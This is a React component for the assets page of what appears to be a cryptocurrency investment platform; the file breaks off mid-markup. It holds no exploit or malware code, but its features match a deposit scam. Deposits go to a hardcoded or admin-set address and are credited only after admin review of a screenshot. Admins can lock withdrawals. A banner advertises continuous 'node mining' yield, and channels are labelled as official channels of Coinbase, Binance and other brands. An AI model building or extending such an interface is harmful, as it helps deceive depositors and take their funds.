import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Wallet, ArrowDownCircle, ArrowUpCircle, RefreshCw, X, Coins, ShieldAlert, CheckCircle2, Info, LogOut, ArrowLeft, Copy, Check, ChevronDown, ChevronRight, Camera, History, Globe, Lock } from 'lucide-react';
import { UserAccount, AppConfig, TransactionLog } from '../types';
import { LANGUAGES, useLanguage } from '../lib/i18n';
import { fetchLogsFromFirestore } from '../lib/firebase';

interface AssetsTabProps {
  userAccount: UserAccount | null;
  connectedAddress: string | null;
  config: AppConfig | null;
  onConnectClick: () => void;
  onDisconnectClick: () => void;
  onDepositSubmit: (amount: number, currency: string, isSimulated: boolean) => Promise<void>;
  onWithdrawSubmit: (amount: number, currency: string) => Promise<void>;
  onExchangeSubmit: (fromCurrency: string, toCurrency: string, amount: number) => Promise<void>;
  initialModal?: 'deposit' | 'withdraw' | 'exchange' | null;
  initialDepositAmount?: string;
  onClearInitialModal?: () => void;
}

export default function AssetsTab({
  userAccount,
  connectedAddress,
  config,
  onConnectClick,
  onDisconnectClick,
  onDepositSubmit,
  onWithdrawSubmit,
  onExchangeSubmit,
  initialModal = null,
  initialDepositAmount = '',
  onClearInitialModal
}: AssetsTabProps) {
  const { t, setLanguage, langName } = useLanguage();
  const [showLanguageModal, setShowLanguageModal] = useState(false);
  const [activeModal, setActiveModal] = useState<'deposit' | 'withdraw' | 'exchange' | null>(initialModal);
  const [selectedCurrency, setSelectedCurrency] = useState('USDT');
  const [selectedDepositNetwork, setSelectedDepositNetwork] = useState('USDT-ETH');
  const [showNetworkDropdown, setShowNetworkDropdown] = useState(false);
  const [copiedAddress, setCopiedAddress] = useState(false);
  const [uploadPreview, setUploadPreview] = useState<string | null>(null);
  const [showDepositHistory, setShowDepositHistory] = useState(false);

  // Withdraw page custom states
  const [withdrawAddressInput, setWithdrawAddressInput] = useState('');
  const [withdrawCurrency, setWithdrawCurrency] = useState('USDT-ETH');
  const [showWithdrawCurrencyDropdown, setShowWithdrawCurrencyDropdown] = useState(false);
  const [showWithdrawHistory, setShowWithdrawHistory] = useState(false);

  const [exchangeFrom, setExchangeFrom] = useState('USDT');
  const [exchangeTo, setExchangeTo] = useState('USDC');
  const [actionAmount, setActionAmount] = useState(initialDepositAmount || '');
  const [historyLogs, setHistoryLogs] = useState<TransactionLog[]>([]);
  const [showExchangeHistory, setShowExchangeHistory] = useState(false);

  // Live real market prices for ETH and BTC
  const [ethPrice, setEthPrice] = useState<number>(() => {
    const saved = localStorage.getItem('last_eth_price');
    return saved ? parseFloat(saved) : 3500;
  });
  const [btcPrice, setBtcPrice] = useState<number>(() => {
    const saved = localStorage.getItem('last_btc_price');
    return saved ? parseFloat(saved) : 65000;
  });

  // Periodically fetch real market prices
  useEffect(() => {
    let isMounted = true;
    const fetchMarketPrices = async () => {
      try {
        const [ethRes, btcRes] = await Promise.allSettled([
          fetch('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT'),
          fetch('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT')
        ]);

        if (ethRes.status === 'fulfilled' && ethRes.value.ok) {
          const ethData = await ethRes.value.json();
          const p = parseFloat(ethData.price);
          if (p > 0 && isMounted) {
            setEthPrice(p);
            localStorage.setItem('last_eth_price', p.toString());
          }
        } else {
          const fallbackRes = await fetch('https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BTC&tsyms=USD');
          if (fallbackRes.ok) {
            const data = await fallbackRes.json();
            if (data.ETH?.USD && isMounted) {
              setEthPrice(data.ETH.USD);
              localStorage.setItem('last_eth_price', data.ETH.USD.toString());
            }
            if (data.BTC?.USD && isMounted) {
              setBtcPrice(data.BTC.USD);
              localStorage.setItem('last_btc_price', data.BTC.USD.toString());
            }
          }
        }

        if (btcRes.status === 'fulfilled' && btcRes.value.ok) {
          const btcData = await btcRes.value.json();
          const bp = parseFloat(btcData.price);
          if (bp > 0 && isMounted) {
            setBtcPrice(bp);
            localStorage.setItem('last_btc_price', bp.toString());
          }
        }
      } catch (e) {
        console.warn('Live crypto price fetch notice:', e);
      }
    };

    fetchMarketPrices();
    const interval = setInterval(fetchMarketPrices, 8000);
    return () => {
      isMounted = false;
      clearInterval(interval);
    };
  }, []);

  // Fetch real transaction logs for the connected user
  useEffect(() => {
    if (!connectedAddress) return;
    const loadUserLogs = async () => {
      const addr = connectedAddress.toLowerCase();
      try {
        const fsLogs = await fetchLogsFromFirestore();
        const userFsLogs = fsLogs.filter(l => l.walletAddress.toLowerCase() === addr);
        setHistoryLogs(userFsLogs.sort((a, b) => b.timestamp - a.timestamp));
      } catch (e) {
        console.warn('Failed to fetch user logs:', e);
      }
    };

    loadUserLogs();
    const interval = setInterval(loadUserLogs, 3000);
    return () => clearInterval(interval);
  }, [connectedAddress, showDepositHistory, showWithdrawHistory, activeModal]);

  useEffect(() => {
    if (initialModal !== undefined) {
      setActiveModal(initialModal);
    }
  }, [initialModal]);

  useEffect(() => {
    if (initialDepositAmount !== undefined && initialDepositAmount !== '') {
      setActionAmount(initialDepositAmount);
    }
  }, [initialDepositAmount]);
  
  const [loading, setLoading] = useState(false);
  const [successMsg, setSuccessMsg] = useState('');
  const [errorMsg, setErrorMsg] = useState('');

  const minDepositUSDT = config?.minDepositUSDT ?? 10;
  const minWithdrawUSDT = config?.minWithdrawUSDT ?? 10;

  useEffect(() => {
    if (activeModal === 'withdraw' && !withdrawAddressInput) {
      setWithdrawAddressInput(connectedAddress || '0x1d6afabf008892f1c04b39d8f42a7f4f5ecbd64c');
    }
  }, [activeModal, connectedAddress]);

  const [recipientAddress, setRecipientAddress] = useState(() => {
    return localStorage.getItem('custom_recipient_address') || config?.recipientAddress || '0x71C7656EC7ab88b098defB751B7401B5f6d1476B';
  });

  useEffect(() => {
    const updated = localStorage.getItem('custom_recipient_address') || config?.recipientAddress || '0x71C7656EC7ab88b098defB751B7401B5f6d1476B';
    setRecipientAddress(updated);
  }, [config, activeModal]);

  const depositNetworks = [
    { id: 'USDT-ETH', name: 'USDT-ETH (Ethereum Chain)', logo: 'https://cryptologos.cc/logos/tether-usdt-logo.svg?v=040' },
    { id: 'USDC-ETH', name: 'USDC-ETH (Ethereum Chain)', logo: 'https://cryptologos.cc/logos/usd-coin-usdc-logo.svg?v=040' }
  ];

  const officialChannels = [
    {
      name: 'Trust Wallet Official Deposit Channel',
      url: 'https://trustwallet.com',
      logo: '🛡️',
      color: 'bg-blue-600'
    },
    {
      name: 'Crypto.com Official Deposit Channel',
      url: 'https://crypto.com',
      logo: '⬡',
      color: 'bg-indigo-950'
    },
    {
      name: 'Cash App Official Deposit Channel',
      url: 'https://cash.app',
      logo: '$',
      color: 'bg-emerald-500'
    },
    {
      name: 'Coinbase Official Deposit Channel',
      url: 'https://www.coinbase.com',
      logo: 'C',
      color: 'bg-blue-600'
    },
    {
      name: 'Binance Official Deposit Channel',
      url: 'https://www.binance.com',
      logo: '❖',
      color: 'bg-amber-500'
    },
    {
      name: 'Huobi Official Deposit Channel',
      url: 'https://www.htx.com',
      logo: '🔥',
      color: 'bg-sky-600'
    }
  ];

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(recipientAddress);
    setCopiedAddress(true);
    setTimeout(() => setCopiedAddress(false), 2000);
  };

  const handleImageChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setUploadPreview(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  if (!connectedAddress) {
    // Wallet connection teaser screen
    return (
      <div className="bg-slate-50 min-h-screen flex flex-col items-center justify-center p-6 text-center font-sans">
        <div className="w-20 h-20 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center mb-4 border border-blue-100">
          <Wallet className="w-10 h-10" />
        </div>
        <h3 className="font-extrabold text-slate-800 text-lg mb-2">My Spot Assets</h3>
        <p className="text-xs text-slate-400 max-w-xs mb-6 leading-relaxed">
          Please connect your Web3 wallet to view on-chain smart asset balances and yield records.
        </p>
        <button
          onClick={onConnectClick}
          className="px-8 py-3 bg-[#0052d4] hover:bg-blue-700 text-white font-bold rounded-full transition shadow-lg shadow-blue-500/25 cursor-pointer text-sm animate-pulse"
        >
          Connect Wallet
        </button>
      </div>
    );
  }

  // Fallback default state just in case, but now App.tsx has localStorage sync so this is rare
  const account = userAccount || {
    walletAddress: connectedAddress,
    usdtBalance: 0,
    occupiedUSDT: 0,
    totalYieldEarned: 0,
    usdcBalance: 0,
    occupiedUSDC: 0,
    btcBalance: 0,
    occupiedBTC: 0,
    lastYieldPayout: Date.now(),
    createdAt: Date.now()
  } as any;

  // Calculate total balance converted to USDT equivalent using real live market price
  const usdtTotal = (account.usdtBalance || 0) + (account.occupiedUSDT || 0);
  const usdcTotal = (account.usdcBalance || 0) + (account.occupiedUSDC || 0);
  const btcTotal = (account.btcBalance || 0) + (account.occupiedBTC || 0);
  const ethTotal = (account.ethBalance || 0) + (account.occupiedETH || 0);
  const totalAssetsUSDC = usdtTotal + usdcTotal + (btcTotal * btcPrice) + (ethTotal * ethPrice);

  const handleDeposit = async (e: React.FormEvent) => {
    e.preventDefault();
    const amt = parseFloat(actionAmount);
    if (isNaN(amt) || amt <= 0) {
      setErrorMsg('Please enter a valid deposit amount.');
      return;
    }
    if (amt < minDepositUSDT) {
      setErrorMsg(`Minimum deposit amount is $${minDepositUSDT} USDT.`);
      return;
    }
    setLoading(true);
    setErrorMsg('');
    try {
      await (onDepositSubmit as any)(amt, selectedDepositNetwork, true, uploadPreview);
      setSuccessMsg(`Deposit request submitted successfully! ${amt} ${selectedDepositNetwork} will be added to your account balance upon Admin review and approval.`);
      setActionAmount('');
      setUploadPreview(null);
      setTimeout(() => {
        setSuccessMsg('');
        setActiveModal(null);
      }, 3500);
    } catch (err: any) {
      setErrorMsg(err.message || 'Deposit request failed');
    } finally {
      setLoading(false);
    }
  };

  const handleWithdraw = async (e: React.FormEvent) => {
    e.preventDefault();
    if (account.isWithdrawLocked) {
      setErrorMsg(account.withdrawLockNotice || 'Your withdrawal functionality is locked by admin. Please contact support.');
      return;
    }
    const amt = parseFloat(actionAmount);
    if (isNaN(amt) || amt <= 0) {
      setErrorMsg('Please enter a valid withdrawal amount.');
      return;
    }
    if (amt < minWithdrawUSDT) {
      setErrorMsg(`Minimum withdrawal amount is ${minWithdrawUSDT} ${selectedCurrency}.`);
      return;
    }
    const avail = getAvailableBalanceFor(selectedCurrency);
    if (amt > avail) {
      setErrorMsg(`Insufficient available balance. Max withdrawable is ${avail} ${selectedCurrency}.`);
      return;
    }
    if (!withdrawAddressInput.trim()) {
      setErrorMsg('Please enter a valid withdrawal address.');
      return;
    }
    setLoading(true);
    setErrorMsg('');
    try {
      await onWithdrawSubmit(amt, selectedCurrency);
      setSuccessMsg(`Withdrawal of ${amt} ${selectedCurrency} requested successfully!`);
      setActionAmount('');
      setTimeout(() => {
        setSuccessMsg('');
        setActiveModal(null);
      }, 3000);
    } catch (err: any) {
      setErrorMsg(err.message || 'Withdrawal failed');
    } finally {
      setLoading(false);
    }
  };

  const handleExchange = async (e: React.FormEvent) => {
    e.preventDefault();
    const amt = parseFloat(actionAmount);
    if (isNaN(amt) || amt <= 0) {
      setErrorMsg('Please enter a valid swap amount.');
      return;
    }
    if (exchangeFrom === exchangeTo) {
      setErrorMsg('Cannot exchange between identical currencies.');
      return;
    }
    const avail = getAvailableBalanceFor(exchangeFrom);
    if (amt > avail) {
      setErrorMsg(`Insufficient available balance. Max swappable is ${avail} ${exchangeFrom}.`);
      return;
    }
    setLoading(true);
    setErrorMsg('');
    try {
      await onExchangeSubmit(exchangeFrom, exchangeTo, amt);
      setSuccessMsg(`Exchanged ${amt} ${exchangeFrom} to ${exchangeTo} successfully!`);
      setActionAmount('');
      setTimeout(() => {
        setSuccessMsg('');
        setActiveModal(null);
      }, 3000);
    } catch (err: any) {
      setErrorMsg(err.message || 'Exchange failed');
    } finally {
      setLoading(false);
    }
  };

  const coinsList = [
    {
      name: 'USDT',
      fullname: 'Tether USDT',
      logo: 'https://cryptologos.cc/logos/tether-usdt-logo.svg?v=040',
      available: account.usdtBalance || 0,
      occupied: account.occupiedUSDT || 0,
      converted: usdtTotal,
      unitPrice: 1,
      color: 'text-teal-500'
    },
    {
      name: 'USDC',
      fullname: 'USD Coin USDC',
      logo: 'https://cryptologos.cc/logos/usd-coin-usdc-logo.svg?v=040',
      available: account.usdcBalance || 0,
      occupied: account.occupiedUSDC || 0,
      converted: usdcTotal,
      unitPrice: 1,
      color: 'text-blue-500'
    },
    {
      name: 'BTC',
      fullname: 'Bitcoin BTC',
      logo: 'https://cryptologos.cc/logos/bitcoin-btc-logo.svg?v=040',
      available: account.btcBalance || 0,
      occupied: account.occupiedBTC || 0,
      converted: btcTotal * btcPrice,
      unitPrice: btcPrice,
      color: 'text-amber-500'
    },
    {
      name: 'ETH',
      fullname: 'Ethereum ETH',
      logo: 'https://cryptologos.cc/logos/ethereum-eth-logo.svg?v=040',
      available: account.ethBalance || 0,
      occupied: account.occupiedETH || 0,
      converted: ethTotal * ethPrice,
      unitPrice: ethPrice,
      color: 'text-indigo-500'
    }
  ];

  const getExchangeRateText = () => {
    if (exchangeFrom === 'BTC') {
      if (exchangeTo === 'ETH') return `1 BTC = ${(btcPrice / ethPrice).toFixed(4)} ETH`;
      return `1 BTC = ${btcPrice.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ${exchangeTo}`;
    } else if (exchangeTo === 'BTC') {
      if (exchangeFrom === 'ETH') return `1 ETH = ${(ethPrice / btcPrice).toFixed(8)} BTC`;
      return `1 ${exchangeFrom} = ${(1 / btcPrice).toFixed(8)} BTC`;
    } else if (exchangeFrom === 'ETH') {
      return `1 ETH = ${ethPrice.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ${exchangeTo}`;
    } else if (exchangeTo === 'ETH') {
      return `1 ${exchangeFrom} = ${(1 / ethPrice).toFixed(6)} ETH`;
    }
    return `1 ${exchangeFrom} = 1.000000 ${exchangeTo}`;
  };

  const getEstimatedReceived = () => {
    const amt = parseFloat(actionAmount) || 0;
    if (exchangeFrom === 'BTC' && exchangeTo === 'ETH') return (amt * (btcPrice / ethPrice)).toFixed(6);
    if (exchangeFrom === 'BTC') return (amt * btcPrice).toFixed(4);
    if (exchangeTo === 'BTC' && exchangeFrom === 'ETH') return (amt * (ethPrice / btcPrice)).toFixed(8);
    if (exchangeTo === 'BTC') return (amt / btcPrice).toFixed(8);
    if (exchangeFrom === 'ETH') return (amt * ethPrice).toFixed(4);
    if (exchangeTo === 'ETH') return (amt / ethPrice).toFixed(6);
    return amt.toFixed(4);
  };

  const getAvailableBalanceFor = (coin: string) => {
    if (coin === 'USDT') return account.usdtBalance || 0;
    if (coin === 'USDC') return account.usdcBalance || 0;
    if (coin === 'BTC') return account.btcBalance || 0;
    if (coin === 'ETH') return account.ethBalance || 0;
    return 0;
  };

  return (
    <div className="bg-slate-50 min-h-screen pb-24 font-sans text-slate-800">
      {/* Top Assets Card Banner - Matches Screenshot 2 perfectly with solid blue vibe */}
      <div className="bg-[#0052d4] px-6 pt-8 pb-8 text-white relative overflow-hidden shadow-md">
        <div className="w-full max-w-7xl mx-auto space-y-5">
          <div className="flex justify-between items-start">
            <div>
              <div className="text-[11px] text-blue-100 font-bold tracking-wide uppercase opacity-80">
                {t('account_balance')} (USDT)
              </div>
              <div className="text-4xl font-extrabold mt-1.5 tracking-tight font-sans">
                {totalAssetsUSDC.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 4 })}
              </div>
            </div>
            
            <div className="flex items-center gap-2">
              <button
                onClick={() => setShowLanguageModal(true)}
                className="p-1.5 bg-white/10 hover:bg-white/20 border border-white/25 text-blue-100 hover:text-white rounded-lg transition cursor-pointer flex items-center justify-center gap-1 text-[10px] font-bold px-2.5 shrink-0"
                title={t('select_language')}
              >
                <Globe className="w-3.5 h-3.5" />
                <span>{langName}</span>
              </button>
              <button
                onClick={() => {
                  if (window.confirm('Are you sure you want to disconnect this wallet?')) {
                    onDisconnectClick();
                  }
                }}
                className="p-1.5 bg-white/10 hover:bg-white/20 border border-white/25 text-blue-100 hover:text-white rounded-lg transition cursor-pointer flex items-center justify-center gap-1 text-[10px] font-bold px-3 shrink-0"
                title="Disconnect"
              >
                <LogOut className="w-3 h-3" />
                Disconnect
              </button>
            </div>
          </div>

          {/* Action buttons list - Matches Screenshot 2 side-by-side style */}
          <div className="grid grid-cols-3 gap-3 pt-1">
            <button
              onClick={() => { setSelectedCurrency('USDT'); setActionAmount(''); setErrorMsg(''); setSuccessMsg(''); setActiveModal('deposit'); }}
              className="py-2.5 border border-white/30 bg-white/10 hover:bg-white/20 rounded-lg font-bold text-xs transition duration-200 cursor-pointer flex items-center justify-center gap-1.5 active:scale-95 text-white"
            >
              <ArrowDownCircle className="w-4 h-4" />
              {t('deposit')}
            </button>
            <button
              onClick={() => { setSelectedCurrency('USDT'); setActionAmount(''); setErrorMsg(''); setSuccessMsg(''); setActiveModal('withdraw'); }}
              className="py-2.5 border border-white/30 bg-white/10 hover:bg-white/20 rounded-lg font-bold text-xs transition duration-200 cursor-pointer flex items-center justify-center gap-1.5 active:scale-95 text-white"
            >
              <ArrowUpCircle className="w-4 h-4" />
              {t('withdraw')}
            </button>
            <button
              onClick={() => { setExchangeFrom('USDT'); setExchangeTo('USDC'); setActionAmount(''); setErrorMsg(''); setSuccessMsg(''); setActiveModal('exchange'); }}
              className="py-2.5 border border-white/30 bg-white/10 hover:bg-white/20 rounded-lg font-bold text-xs transition duration-200 cursor-pointer flex items-center justify-center gap-1.5 active:scale-95 text-white"
            >
              <RefreshCw className="w-3.5 h-3.5" />
              {t('exchange')}
            </button>
          </div>
        </div>
      </div>

      {/* Spot Account Details - Matches Screenshot 2 */}
      <div className="w-full max-w-7xl mx-auto px-4 sm:px-6 md:px-8 mt-6 space-y-4">
        {/* Navigation Indicator & Loading text */}
        <div className="flex justify-between items-center border-b border-slate-200 text-xs font-semibold">
          <div className="relative py-2.5 pr-6 text-[#0052d4] font-extrabold text-sm">
            Spot Account
            <div className="absolute bottom-0 left-0 right-6 h-0.5 bg-[#0052d4] rounded-full" />
          </div>
          <span className="text-slate-400 font-medium text-[11px] flex items-center gap-1 animate-pulse">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-500"></span>
            Loading...
          </span>
        </div>

        {/* Dynamic Accrued Yield Summary Alert */}
        {(account.totalYieldEarned > 0 || totalAssetsUSDC > 0) && (
          <div className="bg-emerald-50 border border-emerald-200/80 p-3.5 rounded-2xl flex items-center justify-between gap-3 text-xs text-emerald-900 shadow-3xs">
            <div className="flex items-center gap-2.5">
              <div className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-ping shrink-0" />
              <div>
                <span className="font-bold text-emerald-800">Node Mining Active:</span> Total Yield Mined:{' '}
                <span className="font-mono font-extrabold text-emerald-700">
                  +{(account.totalYieldEarned || 0).toFixed(6)} USDT
                </span>
                <div className="text-[11px] text-emerald-600 font-medium">
                  Real-time continuous output accumulating into your available balance.
                </div>
              </div>
            </div>
            <div className="text-right shrink-0">
              <span className="text-[10px] font-bold text-emerald-700 bg-emerald-100/90 px-2 py-0.5 rounded-full uppercase">
                Mining 24/7
              </span>
            </div>
          </div>
        )}

        {/* Spot Account Items List */}
        <div className="space-y-3">
          {coinsList.map((coin, idx) => (
            <div
              key={idx}
              className="bg-white rounded-2xl p-4 border border-slate-100 shadow-3xs hover:border-slate-200 transition space-y-3"
            >
              {/* Header section: Coin symbol, name and converted USDT value */}
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-full bg-slate-50 flex items-center justify-center p-1.5 border border-slate-100 shrink-0">
                    <img src={coin.logo} alt={coin.fullname} className="w-full h-full object-contain" />
                  </div>
                  <div>
                    <div className="font-extrabold text-slate-800 text-[14px] flex items-center gap-1.5">
                      <span>{coin.name}</span>
                      {coin.name === 'ETH' && (
                        <span className="text-[10px] text-indigo-600 bg-indigo-50 font-bold px-1.5 py-0.5 rounded border border-indigo-100 flex items-center gap-0.5">
                          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
                          ${ethPrice.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                        </span>
                      )}
                      {coin.name === 'BTC' && (
                        <span className="text-[10px] text-amber-600 bg-amber-50 font-bold px-1.5 py-0.5 rounded border border-amber-100 flex items-center gap-0.5">
                          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
                          ${btcPrice.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                        </span>
                      )}
                    </div>
                    <div className="text-[10px] text-slate-400 font-medium">{coin.fullname}</div>
                  </div>
                </div>

                <div className="text-right">
                  <span className="text-[9px] text-slate-400 font-extrabold uppercase tracking-wider block">Converted (USDT)</span>
                  <span className="font-mono font-extrabold text-[#0052d4] text-[13px] mt-0.5 block">
                    {coin.converted.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                  </span>
                </div>
              </div>

              {/* Sub-grid panel: Available and Occupied balances with absolute spacing */}
              <div className="grid grid-cols-2 gap-2 pt-2.5 border-t border-slate-100/60 text-xs">
                <div className="bg-slate-50/60 p-2.5 rounded-xl border border-slate-100/50">
                  <span className="text-[9px] text-slate-400 font-bold uppercase tracking-wider block mb-0.5">Available Balance</span>
                  <span className="font-mono font-extrabold text-slate-800 text-[11px] block truncate" title={coin.available.toString()}>
                    {coin.available.toLocaleString('en-US', { maximumFractionDigits: 6 })} <span className="text-[10px] text-slate-500 font-medium">{coin.name}</span>
                  </span>
                </div>

                <div className="bg-slate-50/60 p-2.5 rounded-xl border border-slate-100/50">
                  <span className="text-[9px] text-slate-400 font-bold uppercase tracking-wider block mb-0.5">Occupied Balance</span>
                  <span className="font-mono font-extrabold text-slate-500 text-[11px] block truncate" title={coin.occupied.toString()}>
                    {coin.occupied.toLocaleString('en-US', { maximumFractionDigits: 6 })} <span className="text-[10px] text-slate-400 font-medium">{coin.name}</span>
                  </span>
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Dedicated Deposit View (Restored Original Compact Layout) */}
      <AnimatePresence>
        {activeModal === 'deposit' && (
          <div className="fixed inset-0 bg-black/70 backdrop-blur-xs z-50 overflow-y-auto flex items-center justify-center p-3 sm:p-6 font-sans">
            <motion.div
              initial={{ opacity: 0, scale: 0.96, y: 15 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.96, y: 15 }}
              className="bg-white rounded-3xl shadow-2xl w-full max-w-md overflow-hidden border border-slate-200 font-sans my-auto relative text-slate-800"
            >
              {/* Header Bar */}
              <div className="px-5 py-4 border-b border-slate-100 flex items-center justify-between bg-slate-50/80 sticky top-0 z-20">
                <button
                  type="button"
                  onClick={() => {
                    setActiveModal(null);
                    setUploadPreview(null);
                    setErrorMsg('');
                    setSuccessMsg('');
                    if (onClearInitialModal) onClearInitialModal();
                  }}
                  className="p-1.5 rounded-full hover:bg-slate-200 text-slate-700 transition cursor-pointer"
                >
                  <ArrowLeft className="w-5 h-5" />
                </button>
                <div className="text-center">
                  <h3 className="font-extrabold text-slate-900 text-base">Deposit USDT</h3>
                  <p className="text-[10px] text-slate-500 font-medium">On-chain Transfer (ERC-20)</p>
                </div>
                <button
                  type="button"
                  onClick={() => setShowDepositHistory(!showDepositHistory)}
                  className={`p-2 rounded-xl transition cursor-pointer flex items-center gap-1 text-xs font-bold ${
                    showDepositHistory
                      ? 'bg-blue-100 text-[#0052d4]'
                      : 'bg-slate-100 hover:bg-slate-200 text-slate-700'
                  }`}
                  title="Deposit History"
                >
                  <History className="w-4 h-4" />
                </button>
              </div>

              {showDepositHistory ? (
                <div className="p-5 space-y-4 max-h-[80vh] overflow-y-auto">
                  <div className="flex justify-between items-center pb-3 border-b border-slate-100">
                    <div className="flex items-center gap-2">
                      <History className="w-4 h-4 text-[#0052d4]" />
                      <h4 className="font-bold text-slate-800 text-sm">Deposit Records</h4>
                    </div>
                    <button
                      type="button"
                      onClick={() => setShowDepositHistory(false)}
                      className="text-xs text-[#0052d4] font-bold cursor-pointer hover:underline"
                    >
                      &larr; Back to Deposit
                    </button>
                  </div>

                  {historyLogs.filter((l) => l.type === 'deposit').length === 0 ? (
                    <div className="text-center py-12 text-slate-400 space-y-2">
                      <History className="w-10 h-10 mx-auto text-slate-300" />
                      <p className="text-xs font-semibold">No deposit history records found.</p>
                    </div>
                  ) : (
                    <div className="space-y-3">
                      {historyLogs
                        .filter((l) => l.type === 'deposit')
                        .map((log, idx) => {
                          const statusColor =
                            log.status === 'success'
                              ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                              : log.status === 'failed'
                              ? 'bg-red-50 text-red-700 border-red-200'
                              : 'bg-amber-50 text-amber-700 border-amber-200';

                          const statusText =
                            log.status === 'success'
                              ? 'Approved'
                              : log.status === 'failed'
                              ? 'Rejected'
                              : 'Pending';

                          return (
                            <div
                              key={log.id || idx}
                              className="bg-white border border-slate-100 rounded-2xl p-3.5 shadow-2xs space-y-2 hover:border-slate-200 transition text-xs"
                            >
                              <div className="flex justify-between items-center">
                                <span className="font-extrabold text-slate-900">
                                  Deposit USDT (ERC-20)
                                </span>
                                <span
                                  className={`text-[10px] font-extrabold px-2 py-0.5 rounded-full border ${statusColor}`}
                                >
                                  {statusText}
                                </span>
                              </div>

                              <div className="flex justify-between items-baseline pt-0.5">
                                <span className="text-slate-500 font-medium">Amount:</span>
                                <span className="font-mono font-extrabold text-emerald-600 text-sm">
                                  +${log.amount} USDT
                                </span>
                              </div>

                              <div className="text-[10px] text-slate-400 font-mono flex items-center justify-between pt-1.5 border-t border-slate-50">
                                <span>{new Date(log.timestamp).toLocaleString()}</span>
                                {log.txHash && (
                                  <span className="truncate max-w-[120px] text-[10px] text-slate-500">
                                    Tx: {log.txHash.slice(0, 10)}...
                                  </span>
                                )}
                              </div>
                            </div>
                          );
                        })}
                    </div>
                  )}
                </div>
              ) : (
                <div className="p-5 space-y-4 max-h-[85vh] overflow-y-auto">
                  {/* Deposit Currency Selector Row */}
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-slate-800 text-sm">Deposit Currency</span>
                    <div className="flex items-center gap-1.5 font-bold text-slate-900 text-xs bg-slate-50 px-2.5 py-1.5 rounded-xl border border-slate-200">
                      <img
                        src="https://cryptologos.cc/logos/tether-usdt-logo.svg?v=040"
                        alt="USDT"
                        className="w-4 h-4 object-contain"
                      />
                      <span>USDT</span>
                    </div>
                  </div>

                  {/* QR Code Container */}
                  <div className="flex flex-col items-center justify-center my-1">
                    <div className="p-3 border-2 border-[#0052d4] rounded-2xl bg-white shadow-xs">
                      <img
                        src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${recipientAddress}`}
                        alt="Deposit QR Code"
                        className="w-40 h-40 object-contain"
                      />
                    </div>
                    <span className="text-[11px] text-slate-400 font-medium mt-2">Scan to Transfer and Deposit</span>
                  </div>

                  {/* Wallet Address Box */}
                  <div className="bg-[#f7f9fc] rounded-xl p-3 border border-slate-100 flex items-center justify-between gap-2">
                    <span className="font-mono text-[11px] font-semibold text-slate-800 break-all leading-snug select-all">
                      {recipientAddress}
                    </span>
                    <button
                      type="button"
                      onClick={handleCopyAddress}
                      className="p-1.5 text-[#0052d4] hover:bg-blue-50 rounded-lg transition shrink-0 cursor-pointer"
                      title="Copy Address"
                    >
                      {copiedAddress ? <Check className="w-4 h-4 text-emerald-600" /> : <Copy className="w-4 h-4" />}
                    </button>
                  </div>

                  {/* Deposit Amount Input */}
                  <div>
                    <label className="block font-bold text-slate-800 text-xs mb-1.5">Deposit Amount</label>
                    <input
                      type="number"
                      step="any"
                      value={actionAmount}
                      onChange={(e) => setActionAmount(e.target.value)}
                      placeholder={`Please enter (Min: $${minDepositUSDT} USDT)`}
                      className="w-full p-3 bg-[#f7f9fc] border border-slate-200 rounded-xl text-sm font-semibold text-slate-800 placeholder-slate-400 focus:outline-none focus:border-[#0052d4] focus:bg-white transition"
                      required
                    />
                    <div className="text-[10px] text-slate-500 font-medium mt-1">
                      Minimum deposit amount: <span className="font-bold text-slate-800">${minDepositUSDT} USDT</span>
                    </div>
                  </div>

                  {/* Upload Payment Details Screenshot */}
                  <div>
                    <label className="block font-bold text-slate-800 text-xs mb-1.5">
                      Upload Payment Details Screenshot
                    </label>
                    <div className="flex items-center gap-3">
                      <label
                        htmlFor="screenshot-input"
                        className="w-16 h-16 bg-[#f7f9fc] rounded-xl border border-dashed border-slate-300 hover:border-[#0052d4] flex flex-col items-center justify-center cursor-pointer relative overflow-hidden transition group"
                      >
                        {uploadPreview ? (
                          <img src={uploadPreview} alt="Receipt Screenshot" className="w-full h-full object-cover" />
                        ) : (
                          <Camera className="w-6 h-6 text-slate-300 group-hover:text-[#0052d4] transition" />
                        )}
                        <input
                          id="screenshot-input"
                          type="file"
                          accept="image/*"
                          onChange={handleImageChange}
                          className="hidden"
                        />
                      </label>
                      {uploadPreview && (
                        <button
                          type="button"
                          onClick={() => setUploadPreview(null)}
                          className="text-xs text-red-500 font-bold hover:underline cursor-pointer"
                        >
                          Remove
                        </button>
                      )}
                    </div>
                  </div>

                  {errorMsg && <p className="text-xs text-red-500 font-bold">{errorMsg}</p>}
                  {successMsg && (
                    <p className="text-xs text-emerald-600 font-bold bg-emerald-50 p-2.5 rounded-xl border border-emerald-100">
                      {successMsg}
                    </p>
                  )}

                  {/* Confirm Button */}
                  <button
                    type="button"
                    onClick={handleDeposit}
                    disabled={loading}
